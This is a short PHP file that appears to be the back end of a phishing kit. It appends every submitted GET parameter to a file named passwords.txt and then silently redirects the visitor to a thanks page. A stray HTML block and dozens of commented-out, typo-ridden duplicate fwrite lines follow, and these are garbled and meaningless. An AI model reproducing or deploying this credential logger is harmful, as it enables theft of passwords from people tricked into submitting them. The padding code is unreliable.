
<?php
$handle = fopen("passwords.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");

}

fwrite($handle, "\r\n");
fclose($handle);

?> 
<?php 

echo "<script> location.replace('thanks.html'); </script>";

?>
<html>
    <head>
        <body>
           
            <script> function Redirect() {
location.replace("thanks.html");
} </script>
        </body>
    </head>
</html>

//w fwrite($handle, $value);
// fwrfsdfite($handle, "\r\n");
//w fwriite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($jhandle, $fvalue);
// fwrite($handler, "\r\n\r");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwffrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($jhandle, $jvalue);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handjle, "\h\n");

//w fwrite($handle, $value);
// fwrifte($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwriste($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handleh, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwerite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwsdfrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handleee, $value);
// fwrite($handle, "\r\n");

//w fwsdfrite($jhandle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");

//w fwrite($handle, $value);
// fwrite($handle, "\r\n");
